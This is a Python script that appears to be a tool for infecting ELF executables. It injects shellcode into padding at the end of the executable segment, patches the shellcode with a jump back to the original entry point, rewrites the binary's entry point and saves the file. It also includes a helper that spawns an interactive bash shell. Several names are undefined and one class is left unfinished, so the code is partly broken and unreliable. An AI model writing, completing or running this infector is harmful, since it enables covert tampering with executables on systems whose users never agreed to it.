#!/usr/bin/python3

import sys, os, subprocess
import argparse
import code, inspect
import random

p=argparse.ArgumentParser()
p.add_argument("-d", action="store_true")
p.add_argument("-q", "--quick", action="store_true")
p.add_argument("-s", "--shellcode", default="sh")
p.add_argument("-f", "--file", default="a.out")
p.add_argument("--quiet", action="store_true")
p.add_argument("--pie", default="1")
args = p.parse_args()

class Victim:
	def __init__(self, file="a.out"):
		self.file = self.data = self.shellcode = self.shellcodelen = self.eentry = self.exeend = self.injectionoffset = self.disp = False
		self.file = file
		with open(self.file, "rb") as f:
			self.data = bytearray(f.read())
		if shellcodef:
			self.loadshellcode(shellcodef)
	def __repr__(self):
		self.stats = {
			"file": self.file,
			"exeend": hex(self.exeend),
			"shellcodelen": hex(self.shellcodelen),
			"eentry": hex(self.eentry),
			"injectionoffset": hex(self.injectionoffset),
			"disp": hex(self.disp),
		}
		re = ""
		for i, j in self.stats.items():
			re += f"\033[{random.randint(31, 36)}m" + str(i) + ": " + str(j) + "\033[0m\n"
		return re
	def loadshellcode(self, shellcodef):
		with open(shellcodef, "rb") as f:
			self.shellcode = bytearray(f.read())
		self.shellcodelen = len(self.shellcode)
	def geteentry(self):
		"""
		self.eentry = 0
		for i in range(8):
			self.eentry += self.data[0x18+i] * 256**i
		"""
		self.eentry = int.from_bytes(self.data[0x18:0x18+8], "little")
		return self.eentry
	def findinjectionoffset(self):
		x = subprocess.run(rf"readelf -lW {self.file} | grep 'R E' | head -n 1 | awk '{{print $2,$5}}'", shell=True, capture_output=True, text=True).stdout.split()
		print(x)
		try:
			#self.exeend = (int(x[0], 16) + int(x[1], 16) + 0xff) & 0xffffffffffffff00
			self.exeend = (int(x[0], 16) + int(x[1], 16) + 0x1000)
			self.exeend -= self.exeend % 0x1000
			self.injectionoffset = self.exeend - self.shellcodelen
		except:
			print("no")
	def modshellcode(self, signal=[0x78, 0x56, 0x34, 0x12], eentry=None, disp=None):
		signal = bytearray(signal)
		if not eentry:
			eentry = self.eentry
		if not disp:
			disp = eentry - self.injectionoffset
		self.disp = disp
		self.offset = bytearray(disp.to_bytes(4, byteorder="little", signed=True))
		"""
		for i in range(len(self.shellcode)):
			if self.shellcode[i:i+len(signal)] == signal:
				for b in range(len(self.offset)):
					self.shellcode[i+b] = self.offset[b]
				break
		"""
		i = self.shellcode.find(signal)
		if i != -1:
			self.shellcode[i:i+4] = self.offset
		else:
			raise Exception("pattern not found")
	def insert(self, idx=None):
		if not idx:
			idx = self.injectionoffset
		for i in range(self.shellcodelen):
			try:
				self.data[idx+i] = self.shellcode[i]
			except:
				return 1
		return 0
	def bash(self):
		os.system("bash -i")
	def changeeentry(self, new=None):
		if not new:
			new = self.injectionoffset
		for i in range(8):
			self.data[0x18+i] = (new>>0x8*i) & 0xff
		return
	def writein(self, data=None):
		if not data:
			data = self.data
		with open(self.file, "wb") as f:
			f.write(data)
	def __call__(self):
		self.geteentry()
		self.findinjectionoffset()
		self.modshellcode()
		self.insert()
		self.changeeentry()
		self.writein()
		print("default done")
	default = __call__
class Binary:
	def __init__(self, file="sh"):
		with open(file, "rb") as f:
			self.shellcode = f.read()
		self.file = file
	def __call__(self, file="a.out"):
		binary = Victim(file)
		binary.shellcode = self.shellcode
binary = File(file="a.out")

if args.d:
	default()

if not args.quick:
	code.interact(local=dict(globals(), **locals()))
